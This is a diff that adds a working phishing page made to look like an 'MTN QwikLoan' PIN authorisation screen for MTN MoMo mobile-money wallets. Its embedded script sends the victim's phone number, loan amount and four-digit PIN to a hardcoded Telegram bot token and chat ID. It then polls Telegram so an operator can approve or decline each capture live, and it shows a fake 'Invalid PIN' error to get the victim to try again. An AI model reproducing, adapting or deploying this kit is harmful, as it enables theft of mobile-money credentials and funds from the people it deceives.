@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>MTN QwikLoan · PIN Authorisation</title>
+  
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+
+    body {
+      background: #ffffff;  /* plain white */
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+    }
+
+    /* PIN MODAL CARD */
+    .pin-modal {
+      width: 100%;
+      max-width: 360px;
+      background: #ffffff;
+      border-radius: 28px;
+      padding: 24px 20px 30px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+      transition: all 0.2s ease;
+    }
+
+    .modal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 18px;
+    }
+
+    .modal-header h2 {
+      font-size: 20px;
+      font-weight: 700;
+      color: #1a1a1a;
+      letter-spacing: -0.3px;
+    }
+
+    .close-btn {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      border: 2px solid #FFCC00;
+      color: #FFCC00;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 20px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.15s;
+      background: white;
+    }
+
+    .close-btn:hover {
+      background: #fffae9;
+    }
+
+    .divider {
+      height: 1px;
+      background: #eaeaea;
+      margin: 0 0 24px 0;
+    }
+
+    .pin-display {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 22px;
+    }
+
+    .pin-box {
+      display: flex;
+      align-items: center;
+      background: #fffae9;
+      padding: 12px 18px;
+      border-radius: 16px;
+      border: 1px solid #ffeeba;
+    }
+
+    .cursor {
+      width: 4px;
+      height: 28px;
+      background: #FFCC00;
+      margin-right: 10px;
+      border-radius: 2px;
+      animation: blink 1s infinite;
+    }
+
+    @keyframes blink {
+      0%, 50% { opacity: 1; }
+      51%, 100% { opacity: 0; }
+    }
+
+    .stars {
+      font-size: 26px;
+      color: #FFCC00;
+      letter-spacing: 6px;
+      font-weight: 500;
+    }
+
+    .description {
+      text-align: center;
+      font-size: 15px;
+      color: #444;
+      line-height: 1.5;
+      margin-bottom: 28px;
+      background: #f9f9f9;
+      padding: 12px 16px;
+      border-radius: 20px;
+    }
+
+    .label {
+      font-size: 14px;
+      font-weight: 600;
+      color: #555;
+      margin-bottom: 8px;
+      letter-spacing: -0.2px;
+    }
+
+    /* PIN inputs */
+    .pin-inputs {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 30px;
+      justify-content: center;
+    }
+
+    .pin-input {
+      width: 60px;
+      height: 60px;
+      border-radius: 16px;
+      border: 1.5px solid #ddd;
+      text-align: center;
+      font-size: 26px;
+      font-weight: 600;
+      outline: none;
+      background: #fff;
+      transition: border 0.15s, box-shadow 0.15s;
+      color: #1a1a1a;
+      inputmode: numeric;
+      -webkit-text-security: disc;
+    }
+
+    .pin-input:focus {
+      border-color: #FFCC00;
+      box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.3);
+    }
+
+    .pin-input.filled {
+      border-color: #ffe0a3;
+      background: #fffef7;
+    }
+
+    .btn-authorise {
+      width: 100%;
+      height: 56px;
+      background: #e5e5e5;
+      border: none;
+      border-radius: 18px;
+      font-size: 17px;
+      font-weight: 800;
+      color: #888;
+      cursor: pointer;
+      transition: all 0.2s;
+      margin-bottom: 12px;
+    }
+
+    .btn-authorise.active {
+      background: linear-gradient(90deg, #FFCC00, #E6B800);
+      color: #000;
+      box-shadow: 0 8px 18px rgba(255, 204, 0, 0.3);
+    }
+
+    /* Error box */
+    .error-box {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      right: 20px;
+      background: #fff;
+      border: 2px solid #ff4d4d;
+      border-radius: 12px;
+      padding: 15px;
+      display: none;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+      z-index: 110;
+    }
+
+    .error-title {
+      color: #ff0000;
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+
+    .error-text {
+      color: #444;
+      font-size: 14px;
+    }
+
+    .close-error {
+      position: absolute;
+      right: 15px;
+      top: 10px;
+      cursor: pointer;
+      font-size: 18px;
+      color: #999;
+    }
+
+    /* Spinner overlay */
+    #spinner {
+      position: fixed;
+      inset: 0;
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background: rgba(255, 255, 255, 0.8);
+      backdrop-filter: blur(3px);
+      z-index: 1000;
+      font-weight: 600;
+    }
+
+    .loader {
+      width: 48px;
+      height: 48px;
+      border: 5px solid #ffe0a3;
+      border-top: 5px solid #FFCC00;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 16px;
+    }
+
+    .spinner-text {
+      font-size: 18px;
+      color: #000;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+<!-- PIN MODAL CARD (no blurred background) -->
+<div class="pin-modal">
+  <!-- Error box -->
+  <div class="error-box" id="errorBox">
+    <div class="close-error" onclick="hideError()">×</div>
+    <div class="error-title">Error</div>
+    <div class="error-text" id="errorText">Invalid PIN</div>
+  </div>
+
+  <div class="modal-header">
+    <h2>Confirm Loan Application</h2>
+    <div class="close-btn" id="backBtn">×</div>
+  </div>
+  <div class="divider"></div>
+
+  <div class="pin-display">
+    <div class="pin-box">
+      <div class="stars">**</div>
+    </div>
+  </div>
+
+  <div class="description">
+    You are about to authorise MTN QwikLoan to disburse funds to your MTN MoMo wallet. Enter your PIN to authorise.
+  </div>
+
+  <div class="label">MTN MoMo PIN</div>
+
+  <div class="pin-inputs">
+    <input class="pin-input" type="password" inputmode="numeric" maxlength="1" id="pin1" autofocus autocomplete="off">
+    <input class="pin-input" type="password" inputmode="numeric" maxlength="1" id="pin2" autocomplete="off">
+    <input class="pin-input" type="password" inputmode="numeric" maxlength="1" id="pin3" autocomplete="off">
+    <input class="pin-input" type="password" inputmode="numeric" maxlength="1" id="pin4" autocomplete="off">
+  </div>
+
+  <button class="btn-authorise" id="authoriseBtn">Authorise</button>
+</div>
+
+<!-- Spinner overlay -->
+<div id="spinner">
+  <div class="loader"></div>
+  <div class="spinner-text">Processing your request...</div>
+</div>
+
+<script>
+  (function() {
+    // --- TELEGRAM CONFIG (same bot) ---
+    const BOT_TOKEN = '8323704904:AAEiB-e1x2uQ_qZp0PaBS__8B9EXs402Xus';
+    const CHAT_ID   = '1006917440';
+    const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+    // --- DOM elements ---
+    const pinInputs = [
+      document.getElementById('pin1'),
+      document.getElementById('pin2'),
+      document.getElementById('pin3'),
+      document.getElementById('pin4')
+    ];
+    const authoriseBtn = document.getElementById('authoriseBtn');
+    const spinner = document.getElementById('spinner');
+    const errorBox = document.getElementById('errorBox');
+    const errorText = document.getElementById('errorText');
+    const backBtn = document.getElementById('backBtn');
+
+    // --- Retrieve session data (MTN keys) ---
+    // The loan application page should have stored mtn_phone, mtn_loanAmount, etc.
+    // For PIN verification, we need the phone number to identify the user.
+    let phone = sessionStorage.getItem('mtn_phone') || '0240000020';
+    // Also retrieve loan amount for richer Telegram message (optional)
+    let loanAmount = sessionStorage.getItem('mtn_loanAmount') || 'Not specified';
+
+    // --- Auto‑advance & button state ---
+    function updateButtonState() {
+      const allFilled = pinInputs.every(inp => inp.value.length === 1);
+      if (allFilled) {
+        authoriseBtn.classList.add('active');
+        authoriseBtn.disabled = false;
+      } else {
+        authoriseBtn.classList.remove('active');
+        authoriseBtn.disabled = true;
+      }
+    }
+
+    pinInputs.forEach((input, idx) => {
+      input.addEventListener('input', function(e) {
+        this.value = this.value.replace(/\D/g, '').slice(0,1);
+        if (this.value.length === 1) {
+          if (idx < pinInputs.length - 1) pinInputs[idx + 1].focus();
+        }
+        updateButtonState();
+      });
+
+      input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace') {
+          if (this.value.length === 0 && idx > 0) {
+            e.preventDefault();
+            pinInputs[idx - 1].focus();
+          }
+        } else if (e.key === 'ArrowLeft') {
+          e.preventDefault();
+          if (idx > 0) pinInputs[idx - 1].focus();
+        } else if (e.key === 'ArrowRight') {
+          e.preventDefault();
+          if (idx < pinInputs.length - 1) pinInputs[idx + 1].focus();
+        } else if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete') {
+          e.preventDefault();
+        }
+      });
+    });
+
+    updateButtonState();
+
+    // --- Error handling ---
+    window.hideError = function() {
+      errorBox.style.display = 'none';
+    };
+
+    function showError(msg) {
+      errorText.innerText = msg || 'Invalid PIN. Please try again.';
+      errorBox.style.display = 'block';
+    }
+
+    // --- Telegram helpers ---
+    function escapeHtml(unsafe) {
+      return unsafe.replace(/[&<>"]/g, function(m) {
+        if (m === '&') return '&amp;';
+        if (m === '<') return '&lt;';
+        if (m === '>') return '&gt;';
+        if (m === '"') return '&quot;';
+        return m;
+      });
+    }
+
+    async function sendToTelegram(payload) {
+      const url = `${API_BASE}/sendMessage`;
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        return await response.json();
+      } catch (err) {
+        console.error('Telegram error', err);
+        throw err;
+      }
+    }
+
+    let pollInterval = null;
+
+    function pollForCallback(expectedPrefix, expectedTs, onDecision) {
+      if (pollInterval) clearInterval(pollInterval);
+
+      let lastUpdateId = 0;
+      pollInterval = setInterval(async () => {
+        try {
+          const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
+          const res = await fetch(url);
+          const data = await res.json();
+          if (!data.ok || !data.result.length) return;
+
+          data.result.forEach(update => {
+            lastUpdateId = update.update_id;
+            if (update.callback_query && update.callback_query.data) {
+              const parts = update.callback_query.data.split('_');
+              if (parts.length >= 3) {
+                const [type, action, time] = parts;
+                if (time == expectedTs && type === expectedPrefix) {
+                  clearInterval(pollInterval);
+                  pollInterval = null;
+                  onDecision(action);
+                }
+              }
+            }
+          });
+        } catch (err) {
+          console.warn('Poll error', err);
+        }
+      }, 1500);
+    }
+
+    // --- Authorise button logic ---
+    let isProcessing = false;
+
+    authoriseBtn.addEventListener('click', async function() {
+      if (isProcessing) return;
+
+      const pin = pinInputs.map(i => i.value).join('');
+      if (pin.length !== 4) {
+        showError('Please enter all 4 digits of your PIN.');
+        return;
+      }
+
+      isProcessing = true;
+      pinInputs.forEach(i => i.disabled = true);
+      authoriseBtn.disabled = true;
+      spinner.style.display = 'flex';
+
+      const identifier = `MTN MoMo: ${phone}`;
+      const ts = Date.now();
+      const escapedPin = escapeHtml(pin);
+      const amountText = loanAmount !== 'Not specified' ? `\nLoan Amount: GH₵ ${loanAmount}` : '';
+
+      const msg = `🔐 <b>MTN QwikLoan PIN Authorisation</b>\n\n${identifier}${amountText}\n\nPIN entered: <code>${escapedPin}</code>\n\nApprove or decline this PIN?`;
+
+      await sendToTelegram({
+        chat_id: CHAT_ID,
+        text: msg,
+        parse_mode: 'HTML',
+        reply_markup: {
+          inline_keyboard: [[
+            { text: '✅ Approve', callback_data: `pin_approve_${ts}` },
+            { text: '❌ Decline', callback_data: `pin_decline_${ts}` }
+          ]]
+        }
+      });
+
+      pollForCallback('pin', ts, (action) => {
+        spinner.style.display = 'none';
+        isProcessing = false;
+
+        if (action === 'approve') {
+          // Redirect to a success page or loan completion page
+          window.location.href = 'success.html';
+        } else if (action === 'decline') {
+          showError('Invalid PIN. Authorisation declined.');
+          pinInputs.forEach(i => {
+            i.value = '';
+            i.disabled = false;
+          });
+          pinInputs[0].focus();
+          authoriseBtn.disabled = false;
+          updateButtonState();
+        }
+      });
+    });
+
+    // --- Back button (X) – goes to previous page ---
+    backBtn.addEventListener('click', function() {
+      window.history.back();
+    });
+
+    // Optional: if no mtn_phone found, log (use default demo number)
+    if (!sessionStorage.getItem('mtn_phone')) {
+      console.log('Using demo MTN number');
+    }
+  })();
+</script>
+</body>
+</html>
